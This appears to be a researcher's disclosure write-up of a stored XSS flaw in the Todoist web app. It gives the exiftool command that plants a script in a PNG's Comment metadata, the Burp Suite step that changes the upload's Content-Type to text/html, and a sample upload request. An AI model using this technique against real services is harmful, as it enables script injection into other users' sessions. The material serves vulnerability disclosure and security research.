# Todoist App v8484 Stored XSS
I discovered a Stored XSS vulnerability on Todoist's platform through the avatar upload feature
Unrestricted file uploads allowing crafted image files,

    Lack of server-side MIME type verification, and

    Improper sanitization of image metadata (PNG tEXt chunk - Comment field).

This allows an attacker to upload a PNG file that executes arbitrary JavaScript when rendered, leading to stored XSS.

 PoC Technical Details

    Vulnerability Location:

        https://app.todoist.com/app/project/

        https://app.todoist.com/app/task/

    Attack Method:

        A PNG image is created and injected with a script payload into the Comment field using exiftool.
    Exiftool Command:

exiftool -Comment='"><script>alert(prompt("XSS BY Sencer Kilic & Berat Aksit"))</script>' pngtoxss.png 


<img width="750" height="54" alt="1" src="https://github.com/user-attachments/assets/c31c94a9-244e-428d-ad2d-d88f0926fa42" />



    This creates a malicious metadata chunk:

tEXtComment"><script>alert(prompt("XSS BY Sencer Kilic & Berat Aksit"))</script>

<img width="796" height="327" alt="2" src="https://github.com/user-attachments/assets/a6e0fc8a-da12-415f-9829-f526b36524f0" />



    The PNG is then uploaded via the avatar or file upload function.

Content-Type Override:

    During upload, using Burp Suite, the Content-Type header of the file is changed:

        From: image/png

        To: text/html

Request Sample:

POST /api/v1/uploads HTTP/2
Host: app.todoist.com
Content-Type: multipart/form-data; boundary=...
...
Content-Disposition: form-data; name="file"; filename="pngtoxss.png"
Content-Type: text/html

<img width="950" height="466" alt="2" src="https://github.com/user-attachments/assets/e2170ba6-3f24-4d64-ab6f-cfaa5ebe41f7" />

<img width="783" height="428" alt="3" src="https://github.com/user-attachments/assets/cd344eef-d74b-4a4f-aa13-93b4a34ae577" />

<img width="954" height="491" alt="5" src="https://github.com/user-attachments/assets/1f191fdd-6fad-4afc-aad4-6ef8b84f11b1" />


Result:
The file is successfully uploaded and stored on cloudfront.net 

CDN:

   https://d1ysz50cxb9zwl.cloudfront.net/.../file.png

  https://d1ysz50cxb9zwl.cloudfront.net/Hqrm6dtqk-uJQqsDlBsHlaXJGVfNsdSWndNtYEhynhPp75G4kI4Gvo6ZyPeL6Zce/by/54863037/as/file.png?Expires=1753944966&Signature=SSZgohwHkdjD9vC7CHs03rYFR5OLwnBGgXk2ciwXdMVkeRH2BEspYiHSI1RgJIWc9amiPnbvIO2u7BFFBvnfDTuhTisfmOYAQRo8OsGFGDe0KSeOqCr8eH9H7JQtvxreko0ih4diqURD8WCt4man6Vka0AMGs59s-n68P~4x~TYIGfeuUPgQY-CX8tcRdSE0NrWLHL6Of7w02jWA2Nk1giZt~~CStwGdO3diFxS5lYorZ7lkvnCe~9VObDdASogr-2YKDamVvqtORqwAwpibyxoTKvw00lVLLJDqqT9yRC~jIkJksqWhkfbuqF3iYJh4g5BkHK1ML-EGlTCLqMk-9Q__&Key-Pair-Id=APKAJAERRT46LD6FN4NA

  
   <img width="947" height="441" alt="6" src="https://github.com/user-attachments/assets/33c135f6-b3e4-46da-9060-7cd161eb5320" />


    When previewed or rendered, the embedded JavaScript executes due to improper sanitization and MIME type handling.


    
